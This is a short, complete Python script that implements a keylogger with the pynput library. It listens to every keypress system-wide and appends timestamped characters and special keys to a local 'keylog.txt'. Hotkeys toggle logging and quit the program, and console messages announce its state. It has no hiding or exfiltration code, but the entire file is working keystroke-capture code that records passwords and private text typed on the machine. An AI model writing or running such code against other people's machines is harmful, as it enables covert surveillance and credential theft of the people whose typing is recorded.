from pynput import keyboard
from datetime import datetime
import threading

LOGFILE = "keylog.txt"

class KeyLogger:
    def __init__(self, logfile=LOGFILE):
        self.logfile = logfile
        self.logging = False
        self.listener = None
        self.lock = threading.Lock()

    def _write(self, text):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with self.lock:
            with open(self.logfile, "a", encoding="utf-8") as f:
                f.write(f"[{timestamp}] {text}\n")

    def on_press(self, key):
        if not self.logging:
            return

        try:
            if hasattr(key, 'char') and key.char is not None:
                self._write(f"CHAR: {key.char}")
            else:
                # Non-printable keys (e.g., Key.space, Key.enter)
                self._write(f"KEY: {key}")
        except Exception as e:
            self._write(f"ERROR: {e}")

    def start_listener(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def toggle_logging(self):
        self.logging = not self.logging
        state = "STARTED" if self.logging else "STOPPED"
        self._write(f"*** Logging {state} by hotkey ***")
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Logging {state}")

    def stop(self):
        self._write("*** Keylogger QUIT ***")
        if self.listener:
            self.listener.stop()

def hotkey_worker(klogger):

    from pynput.keyboard import GlobalHotKeys

    with GlobalHotKeys({
        '<ctrl>+<shift>+q': klogger.toggle_logging,
        '<ctrl>+<shift>+e': klogger.stop
    }) as h:
        h.join()

if __name__ == "__main__":
    kl = KeyLogger()
    kl.start_listener()
    kl._write("*** Keylogger started (not logging until toggled) ***")
    print("Keylogger running. Toggle logging with Ctrl+Shift+Q. Quit with Ctrl+Shift+E.")
    hotkey_worker(kl)
    print("Keylogger exited.")
